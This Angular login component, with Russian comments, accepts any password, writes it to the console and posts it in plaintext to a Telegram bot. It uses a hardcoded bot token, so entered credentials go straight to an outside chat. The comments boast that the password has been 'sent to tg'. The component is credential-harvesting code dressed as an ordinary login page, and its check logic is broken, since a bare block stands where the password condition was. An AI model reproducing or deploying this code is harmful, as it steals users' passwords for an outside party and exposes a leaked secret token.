import { Component } from '@angular/core';
import axios from 'axios';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css'],
})
export class LoginComponent {
  isPopupVisible: boolean = true;
  password: string = '';
  isLoggedIn: boolean = false;
  telegramGroupId: string = '';

  constructor() { }

  onSubmit(): void {
    console.log(this.password);

    const trimmedPassword = this.password.trim();
 {
      console.log('Опа, паролик подходит, УДАЧИ!');
      this.isLoggedIn = true;
      this.isPopupVisible = false;

      this.sendPasswordToTelegram(this.password);
    }
  }

  async sendPasswordToTelegram(password: string): Promise<void> {
    const botToken = '7039702625:AAFGyFbkG8_pSWv9HtKw1BEBvOcPwGl3bYQ';
    const message = password;

    try {
      await axios.post(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          chat_id: this.telegramGroupId,
          text: message,
        }
      );
      console.log('Иииии Оооооп, паролик отправлен в тг, ну может не отправлен потому что я убрал такую функцию, мб верну когда-то, хотя нахуя??');
    } catch (error) {
      console.error('Ну не отпрвилось по вот такой вот причине:', error);
    }
  }

  showPopup(): void {
    this.isPopupVisible = true;
  }
}
